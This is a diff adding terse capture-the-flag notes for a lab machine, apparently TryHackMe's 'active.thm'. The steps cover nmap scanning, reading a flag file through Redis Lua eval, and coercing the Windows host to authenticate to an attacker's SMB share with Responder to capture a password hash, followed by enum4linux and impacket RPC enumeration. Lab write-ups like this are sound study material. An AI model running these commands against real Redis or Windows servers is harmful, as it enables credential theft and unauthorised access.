@@ -1,0 +1,26 @@
+enum starting when you got machine
+
+nmap -A -sC -sV -p-
+
+redis-cli -h 
+[active.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
+
+Now, I set-up responder by running this:
+
+responder -I tun0 -rdvw
+
+Then ran this command on redis-cli:
+
+eval "dofile('//10.9.1.100/share')" 0
+
+(You can write anything in place of share, the share does not need to exist)
+And we have got the user’s pasword hash!]
+
+enum4linux -a
+           -ng -A 
+           
+impacket-rpcdump @active.thm
+
+impacket-rpcdump @active.thm | egrep 'MS-RPRN|MS-PAR'
+
+
